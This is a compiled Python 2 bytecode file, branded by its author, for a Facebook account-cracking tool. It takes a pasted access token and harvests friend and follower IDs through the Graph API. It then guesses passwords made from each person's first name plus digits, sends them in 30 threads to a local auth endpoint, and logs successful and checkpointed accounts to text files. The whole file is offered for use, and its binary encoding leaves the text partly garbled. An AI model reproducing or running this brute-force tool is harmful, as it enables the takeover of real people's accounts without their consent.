ó
|»`c           @   sã  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z y e  j d  Wn e k
 rè n Xd  d l m Z e j d d  Z e j d d  Z i e e  d	 6e e  d
 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e e  e j d  d Z d   Z d   Z d   Z d   Z  d   Z! d   Z" d   Z# e$ d k rße   n  d S(    iÿÿÿÿN(   t
   ThreadPools   /sdcard/ids(   t   ConnectionErrorg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginet   utf8s   
 [0;32m     _______  _______  _______ _________
 [0;31m    (  ____ \(  ___  )(       )\__   __/
 [0;33m    | (    \/| (   ) || () () |   ) (   
 [0;34m    | (_____ | |   | || || || |   | |   
 [0;35m    (_____  )| |   | || |(_)| |   | |   
 [0;36m          ) || |   | || |   | |   | |   
 [0;31m    /\____) || (___) || )   ( |___) (___
 [0;33m    \_______)(_______)|/     \|\_______/
     [101m[37;1mCODED BY SOMI-AWAN[0m
[1;97m-----------------------------------------------
[0;35mâ DEVOLPER   :  SOMI AWAN
[0;35mâ WHATSAAP   :  03455453538
[0;35mâ FACEBOOK   :  https://www.facebook.com/SO MI
[1;97m-----------------------------------------------
c          C   s   t  j d  y  t d d  j   }  t   Wnd t t f k
 r t GHd GHd GHd GHt d  }  t d d  } | j	 |   | j
   t   n Xd  S(   Nt   clears   access_token.txtt   rt    s   	Login tokens    Paste token here: t   w(   t   ost   systemt   opent   readt   menut   KeyErrort   IOErrort   logot	   raw_inputt   writet   close(   t   tokent   sav(    (    s   /sdcard/man.pyt   login"   s    
c          C   sO  t  j d  y t d d  j   }  Wn t t f k
 rF t   n Xy9 t j d |  d t	 } t
 j | j  } | d } WnF t k
 rÈ t GHd GHd GHt  j d	  d GHt j d
  t   n Xt  j d  t GHd GHd | GHd GHd GHd GHt  j d  t  j d  t  j d  t  j d  d d GHd GHd GHd GHt   d  S(   NR   s   access_token.txtR   s+   https://graph.facebook.com/me?access_token=t   headerst   nameR   s   	Logged in token has expireds   rm -rf access_token.txti   s
    Welcome: s    Activation: Free modes   cd ..... && npm installs   fuser -k 5000/tcp &t   #s   cd ..... && node index.js &i/   t   -s    [1] Crack with digit pass(   R	   R
   R   R   R   R   R   t   requestst   gett   headert   jsont   loadst   textR   t   timet   sleept   menu_option(   R   R   t   qR   (    (    s   /sdcard/man.pyR   3   sB    		c          C   s¦   t  d  }  |  d k r" t   n |  d k r8 t   nj |  d k rT t j d  nN |  d k rp t j d  n2 |  d k r t j d	  n d
 GHd GHd
 GHt   d  S(   Ns    Choose option: t   11t   1t   3s%   xdg-open https://youtu.be/gcdZwOqkZSgt   4s%   xdg-open https://youtu.be/tncUQGIok8ct   5s%   xdg-open https://youtu.be/xN-l-dTj6aYR   s   	Select valid option(   R   t   crackt   choiceR	   R
   R#   (   t   select(    (    s   /sdcard/man.pyR#   V   s    

c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not found i   s   	Crack with Name passs   [1] Crack public ids   [2] Crack followerss   [0] Back(   R	   R
   R   R   R   R   R!   R"   t   login_choiceR   t   crack_select(    (    (    s   /sdcard/man.pyR*   g   s$    c             s9  t  d  }  g  } g   g    |  d k r¢t j d  t GHd GHd GHd GHt  d  } t  d   t  d   t  d   t  d   ye t j d | d	 t d
 t } t j	 | j
  } t j d  t GHd GHd GHd GHd | d GHWn, t k
 rd GHd GHt  d  t   n Xt j d | d t d
 t } t j	 | j
  } x| d D]B } | d } | d } | j d  d }	 | j | d |	  qYWn´|  d k r*t j d  t GHd GHd GHd GHt  d  } t  d   t  d   t  d   t  d   ye t j d | d	 t d
 t } t j	 | j
  } t j d  t GHd GHd GHd GHd | d GHWn, t k
 rd GHd GHt  d  t   n Xt j d | d t d d
 t } t j	 | j
  } x} | d D]B } | d } | d } | j d  d }	 | j | d |	  qáWn, |  d k r@t   n d GHd GHd GHt   d t t |   GHd GHd GHd d GHd GHd  GHd d GHd GH       f d!   }
 t d"  } | j |
 |  d GHd d GHd GHd# GHd$ t t    d% t t     GHd GHd d GHd GHt  d  t   d  S(&   Ns    Choose option: R&   R   R   s   	Name pass crackings    Input id: s    Name + your digit: s   https://graph.facebook.com/s   ?access_token=R   s    Cloning from : R   s   	Invalid link OR tokens    Press enter to backs   /friends?access_token=t   datat   idt    i    t   |t   2s    Cloning from: s   	Invalid id links   /subscribers?access_token=s   &limit=999999t   0s   	Select valid options    Total IDs : s    The Process has startedi/   R   s*   	[1;32mCreated by: HST (HOP) Group[0;97mc            s  |  } | j  d  \ } } yX| j    } t j d | d | d t j } t j |  } d | k rÈ d | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nªd | d k r3d | d | d GHt d d
  } | j	 | d | d  | j
     j | |  n?| j    }	 t j d | d |	 d t j } t j |  } d | k rÝd | d |	 d GHt d	 d
  } | j	 | d |	 d  | j
    j | |	  nd | d k rHd | d |	 d GHt d d
  } | j	 | d |	 d  | j
     j | |	  n*| j    }
 t j d | d |
 d t j } t j |  } d | k ròd | d |
 d GHt d	 d
  } | j	 | d |
 d  | j
    j | |
  nd | d k r]d | d |
 d GHt d d
  } | j	 | d |
 d  | j
     j | |
  n| j    } t j d | d | d t j } t j |  } d | k rd | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nk d | d k rrd | d | d GHt d d
  } | j	 | d | d  | j
     j | |  n  Wn n Xd  S(   NR2   s   http://localhost:5000/auth?id=s   &pass=R   t   locs    [1;35m[HST-OK] [1;32ms    | s   [0;97ms   successful.txtt   as   
s   www.facebook.comt   errors    [1;33m[HST-CP] s   checkpoint.txt(   t   splitt   lowerR   R   R   R    R   R   R   R   R   t   appendt   apppend(   t   argt   usert   uidR   t   pass1R/   R$   t   okt   cpt   pass2t   pass3t   pass4(   t   cpst   okst   p1t   p2t   p3t   p4(    s   /sdcard/man.pyt   mainÏ   s    $

$

$

$

i   s    The process has completeds    Total Ok/Cp:t   /(   R   R	   R
   R   R   R   R   R   R   R   R    R   R*   t   rsplitR:   R   R.   t   strt   lenR    t   map(   R,   R0   t   idtR   R$   t   zt   iR>   t   nat   nmRK   t   p(    (   RE   RF   RG   RH   RI   RJ   s   /sdcard/man.pyR.   {   s¾    !
!

!
%


		K	)	
c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not foundi   s   	Digit pass crackings   [1] Crack public ids   [2] Crack followerss   [0] Back(   R	   R
   R   R   R   R   R!   R"   R-   R   t   choice_select(    (    (    s   /sdcard/man.pyR+   &  s$    c             s4  t  d  }  g  } g   g    |  d k rt j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d   t  d  } y` t j d | d	 t d
 t } t j	 | j
  } t j d  t GHd GHd GHd | d GHWn, t k
 rd GHd GHt  d  t   n Xt j d | d t d
 t } t j	 | j
  } x| d D]B } | d } | d } | j d  d }	 | j | d |	  qTWn´|  d k r%t j d  t GHd GHd GHd GHt  d   t  d   t  d   t  d   t  d  } ye t j d | d	 t d
 t } t j	 | j
  } t j d  t GHd GHd GHd GHd | d GHWn, t k
 rd GHd GHt  d  t   n Xt j d | d t d d
 t } t j	 | j
  } x} | d D]B } | d } | d } | j d  d }	 | j | d |	  qÜWn, |  d k r;t   n d GHd GHd GHt   d t t |   GHd GHd GHd d GHd GHd GHd d GHd GH       f d    }
 t d!  } | j |
 |  d GHd d GHd GHd" GHd# t t    d$ t t     GHd GHd d GHd GHt  d  t   d  S(%   Ns   Choose option: R&   R   R   s   	Digit pass crackings    Password: s    Input id: s   https://graph.facebook.com/s   ?access_token=R   s    Cloning from : R   s   	Invalid id links    Press enter to backs   /friends?access_token=R/   R0   R1   i    R2   R3   s    Cloning from: s   /subscribers?access_token=s   &limit=999999R4   s&   	    [1;31mSelect valid option[0;97ms    Total IDs : s    The Process has startedi/   R   s$   	[1;32mSomi High Rated Brand[0;97mc   	         s  |  } | j  d  \ } } yZt j d | d  d t j } t j |  } t d } d | k rÂ d | d  d	 GHt d
 d  } | j	 | d  d  | j
    j |   n²d | d k r=d | d  d | d	 GHt d d  } | j	 | d  d | d  | j
     j |   n7t j d | d  d t j } t j |  } d | k r×d | d  d	 GHt d
 d  } | j	 | d  d  | j
    j |   nd | d k rJd | d  d | d	 GHt d d  } | j	 | d  d  | j
     j |   n*t j d | d  d t j } t j |  } d | k räd | d  d	 GHt d
 d  } | j	 | d  d  | j
    j |   nd | d k r_d | d  d | d	 GHt d d  } | j	 | d  d | d  | j
     j |   nt j d | d  d t j } t j |  } d | k rùd | d  d	 GHt d
 d  } | j	 | d  d  | j
    j |   n{ d | d k rtd | d  d | d	 GHt d d  } | j	 | d  d | d  | j
     j |   n  Wn n Xd  S(   NR2   s   http://localhost:5000/auth?id=s   &pass=R   t   birthdayR5   s    [1;35m[HST-OK] [1;32ms    | s   [0;97ms   successful.txtR6   s   
s   www.facebook.comR7   s    [1;33m[HST-CP] s   checkpoint.txt(   R8   R   R   R   R    R   R   t   bR   R   R   R:   R;   (	   R<   R=   R>   R   R/   R$   t   tlR@   RA   (   RE   RF   R?   RB   RC   RD   (    s   /sdcard/man.pyRK     s|    $

!
$

$
!
$
!
i   s    The process has completeds    Total Ok/Cp:RL   (   R   R	   R
   R   R   R   R   R   R   R   R    R   R+   RM   R:   R   RW   RN   RO   R    RP   (   R,   R0   RQ   R   R$   RR   RS   R>   RT   RU   RK   RV   (    (   RE   RF   R?   RB   RC   RD   s   /sdcard/man.pyRW   :  s¼    !
!

!
%


		H	)	
t   __main__(%   R	   t   sysR!   t   datetimet   randomt   hashlibt   ret	   threadingR   t   getpasst   urllibt	   cookielibR   t   uuidt   stringt   multiprocessing.poolR    t   mkdirt   OSErrort   requests.exceptionsR   t   randintt   bdt   simt   reprR   t   reloadt   setdefaultencodingR   R   R   R#   R*   R.   R+   RW   t   __name__(    (    (    s   /sdcard/man.pyt   <module>   s*   ´P
		#			«		§


	